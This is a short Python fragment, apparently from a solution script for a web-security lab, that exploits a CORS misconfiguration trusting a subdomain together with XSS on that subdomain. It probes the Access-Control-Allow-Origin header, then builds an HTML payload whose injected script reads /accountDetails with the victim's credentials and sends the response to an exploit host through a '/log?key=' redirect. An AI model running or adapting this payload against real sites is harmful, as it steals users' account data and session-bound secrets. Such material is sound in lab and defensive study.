...
form_headers["Origin"] = f"https://stock.{home_host}"
res_cors = requests.get(f"https://{home_host}{path_check}", headers=form_headers)

if res_cors.headers.get('Access-Control-Allow-Origin') == f'https://stock.{home_host}':
...
payload = f"""<script>
    document.location="http://stock.{home_host}/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://{home_host}/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {{location='https://{exploit_host}/log?key='%2bthis.responseText; }};%3c/script>&storeId=1"
</script>"""
